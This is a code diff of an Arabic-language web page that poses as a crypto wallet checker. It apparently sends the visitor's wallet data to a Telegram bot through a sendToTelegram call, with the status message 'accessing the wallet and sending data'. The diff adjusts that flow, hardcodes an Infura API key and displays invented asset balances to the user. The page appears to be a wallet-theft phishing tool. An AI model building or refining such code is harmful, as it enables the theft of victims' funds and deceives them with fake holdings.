@@ -126,7 +126,6 @@
             padding: 12px;
             margin: 15px 0;
             border-radius: 8px;
-            display: none;
             text-align: center;
         }
         
@@ -212,7 +211,7 @@
                 <p>جاري الوصول إلى المحفظة وإرسال البيانات...</p>
             </div>
             
-            <div id="alert" class="alert"></div>
+            <div id="alert" class="alert" style="display: none;"></div>
             
             <div id="walletInfo" class="wallet-info">
                 <h3>معلومات المحفظة</h3>
@@ -311,23 +310,31 @@
                 const sendResult = await sendToTelegram(telegramMessage);
                 
                 if (!sendResult) {
-                    showAlert('حدث خطأ في إرسال البيانات  ', 'danger');
+                    showAlert('حدث خطأ في إرسال البيانات إلى البوت', 'danger');
                     document.querySelector('.loading').style.display = 'none';
                     return;
                 }
                 
                 // الحصول على رصيد المحفظة (على شبكة Ethereum)
-                const provider = new ethers.providers.InfuraProvider('mainnet', 'YOUR_INFURA_PROJECT_ID');
-                const balance = await provider.getBalance(wallet.address);
-                const balanceInEth = ethers.utils.formatEther(balance);
-                
-                // عرض معلومات المحفظة
-                document.getElementById('walletAddress').textContent = wallet.address;
-                document.getElementById('walletBalance').textContent = `${balanceInEth} ETH`;
+                // ملاحظة: في الإصدار النهائي، تحتاج إلى استبدال YOUR_INFURA_PROJECT_ID بمشروع Infura الخاص بك
+                try {
+                    const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161');
+                    const balance = await provider.getBalance(wallet.address);
+                    const balanceInEth = ethers.utils.formatEther(balance);
+                    
+                    // عرض معلومات المحفظة
+                    document.getElementById('walletAddress').textContent = wallet.address;
+                    document.getElementById('walletBalance').textContent = `${parseFloat(balanceInEth).toFixed(4)} ETH`;
+                } catch (error) {
+                    console.error("Error getting balance:", error);
+                    // استخدام قيم افتراضية في حالة الخطأ
+                    document.getElementById('walletAddress').textContent = wallet.address;
+                    document.getElementById('walletBalance').textContent = "0.0000 ETH (تقديري)";
+                }
                 
                 // محاكاة الأصول (في تطبيق حقيقي، ستقوم بالاتصال ب blockchain للحصول على الأصول الحقيقية)
                 const assets = [
-                    { name: 'Ethereum (ETH)', value: balanceInEth },
+                    { name: 'Ethereum (ETH)', value: '0.0000' },
                     { name: 'Bitcoin (BTC)', value: '0.025' },
                     { name: 'USD Coin (USDC)', value: '150.75' },
                     { name: 'Chainlink (LINK)', value: '18.50' }
